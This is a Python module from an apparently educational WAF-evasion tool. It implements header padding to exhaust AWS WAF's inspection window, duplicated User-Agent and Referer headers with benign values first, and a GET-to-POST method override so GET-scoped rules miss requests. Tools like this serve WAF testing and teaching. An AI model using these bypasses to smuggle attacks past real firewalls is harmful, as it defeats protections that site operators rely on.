"""Header-level transforms: inspection-window padding and field ambiguity."""
from __future__ import annotations

from dataclasses import replace

from ..spec import HeaderValue, ReqSpec
from . import Ctx, Transform, VENDORS, register

#: Bytes of padding injected by header_pad_early: just under the measured
#: ~8 KB AWS Headers(ALL) window with margin for the request's own headers.
PAD_BYTES_DEFAULT = 7000
#: Keep total padded header count far under the measured 200-header cap.
_PAD_HEADER_COUNT = 10

_BENIGN_UA = "Mozilla/5.0 (X11; Linux x86_64) waf_requests-education"
_BENIGN_REFERER = "https://example.test/"


@register(Transform(
    id="header_pad_early",
    vendors=VENDORS,
    category="headers",
    risk="standard",
    docs_path="docs/techniques/header_pad_early.md",
    explain="inject padded benign headers ahead of existing ones",
))
def header_pad_early(spec: ReqSpec, ctx: Ctx) -> "ReqSpec | None":
    """Exhaust the WAF's header-inspection budget before the real headers.

    Repo-measured against AWS WAF: Headers(ALL) truncates near 8 KB / 200
    headers; padding placed ahead of payload-bearing headers was a proven
    bypass. Padding lands before every original header.
    """
    budget = ctx.profile_limit or PAD_BYTES_DEFAULT * 2
    # Leave a small margin under the budget; scales down for tiny limits so
    # docs demos can show the geometry.
    pad_bytes = min(PAD_BYTES_DEFAULT, max(0, budget - 64))
    if pad_bytes <= 0:
        return None
    per_header = pad_bytes // _PAD_HEADER_COUNT + 1
    pads: "dict[str, HeaderValue]" = {
        f"X-Waf-Pad-{i}": "A" * per_header for i in range(_PAD_HEADER_COUNT)
    }
    headers = {**pads, **spec.headers}
    return replace(spec, headers=headers)


@register(Transform(
    id="dup_header_firstlast",
    vendors=VENDORS,
    category="headers",
    risk="standard",
    docs_path="docs/techniques/dup_header_firstlast.md",
    explain="duplicate user-agent/referer with a benign value first",
))
def dup_header_firstlast(spec: ReqSpec, ctx: Ctx) -> "ReqSpec | None":
    """Send two copies of security-relevant fields: benign first, original second.

    RFC 9110 5.2 lets stacks combine or order duplicated fields differently;
    some readers take the first occurrence, others the last. Which side wins
    depends on the stack - the docs page says so explicitly.
    """
    benign = {"user-agent": _BENIGN_UA, "referer": _BENIGN_REFERER}
    headers: "dict[str, HeaderValue]" = {}
    changed = False
    for key, value in spec.headers.items():
        lowered = key.lower()
        if lowered in benign and isinstance(value, str):
            headers[key] = [benign[lowered], value]
            changed = True
        else:
            headers[key] = value
    if not changed:
        return None
    return replace(spec, headers=headers)


@register(Transform(
    id="method_override",
    vendors=VENDORS,
    category="headers",
    risk="conditional",
    docs_path="docs/techniques/method_override.md",
    explain="convert GET to POST with X-HTTP-Method-Override: GET",
))
def method_override(spec: ReqSpec, ctx: Ctx) -> "ReqSpec | None":
    """Retag method so rules scoped to GET miss the request.

    Requires an origin honoring override headers (Flask does not natively);
    documented conditional.
    """
    if spec.method != "GET":
        return None
    updated = replace(
        spec,
        method="POST",
        headers={**spec.headers, "X-HTTP-Method-Override": "GET"},
    )
    return updated
